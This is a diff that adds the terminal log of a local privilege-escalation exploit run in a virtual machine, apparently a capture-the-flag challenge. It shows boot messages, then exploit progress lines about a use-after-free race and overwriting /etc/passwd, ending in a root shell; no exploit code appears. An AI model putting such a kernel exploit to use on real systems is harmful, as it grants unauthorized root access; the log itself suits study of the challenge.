@@ -1,0 +1,38 @@
+[+] starting exploit localy...
+c[?7l[2J[0mSeaBIOS (version 1.16.3-debian-1.16.3-2)
+
+
+iPXE (https://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+0EFCAE00+0EF0AE00 CA00
+Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               
+
+
+Booting from ROM..c[?7l[2Jfail to initialize ptp_kvm
+
+Boot took 2.55 seconds
+
+__________________ .____       _____    _______  ________   
+\______   \_____  \|    |     /  _  \   \      \ \______ \  
+ |     ___/ _(__  <|    |    /  /_\  \  /   |   \ |    |  \ 
+ |    |    /       \    |___/    |    \/    |    \|    `   \
+ |____|   /______  /_______ \____|__  /\____|__  /_______  /
+                 \/        \/       \/         \/        \/ 
+/ $ [H[J/ $ [J/ex/ $ /exploit [J
+[*][T1] thread created
+[!] releasing UAF page
+fd @ 63: 1 -> 2
+UAF fd: 63
+[*] starting exploit
+[*] firing race
+[*] waiting pid unlocked @ fd 63
+[*][T1] Slowing write...
+[*][T2] Start!
+[*][T2] Sprayed /etc/passwd!
+[*] Written to fd 63
+[*][T1] slow_write finished
+# whoami
+root
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# ls /flag
+ls: /flag: No such file or directory
+# ls /
